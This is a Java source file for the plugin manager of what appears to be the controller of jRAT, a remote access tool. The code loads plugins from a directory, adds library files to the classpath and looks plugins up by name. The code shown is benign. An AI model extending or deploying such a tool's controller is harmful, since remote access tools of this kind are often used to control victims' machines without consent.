package io.jrat.controller.addons;

import io.jrat.common.Logger;
import io.jrat.controller.Globals;
import io.jrat.controller.Main;
import io.jrat.controller.utils.ClassUtils;
import java.io.File;
import java.util.List;
import jrat.api.Plugin;
import pluginlib.PluginLoader;

public class Plugins {

	private static PluginLoader<Plugin> loader;
	
	public static void init() throws Exception {
		loader = new PluginLoader<Plugin>(Globals.getPluginDirectory());
		loader.loadPlugins();
	}
	
	public static PluginLoader<Plugin> getLoader() {
		return loader;
	}
	
	public static List<Plugin> getPlugins() {
		return loader.getPlugins();
	}

	public static void loadLibs() throws Exception {
		File dir = Globals.getLibDirectory();

		for (File file : dir.listFiles()) {
			Logger.log("Loading library: " + file.getName());
			ClassUtils.addToClassPath(file);
		}
	}

	public static void register(pluginlib.Plugin<Plugin> plugin) {
		loader.getRawPlugins().remove(plugin);
		loader.getRawPlugins().add(plugin);
	}

	public static Plugin getPlugin(String name) {
		for (Plugin plugin : loader.getPlugins()) {
			if (plugin.getName().equalsIgnoreCase(name)) {
				return plugin;
			}
		}

		return null;
	}

}
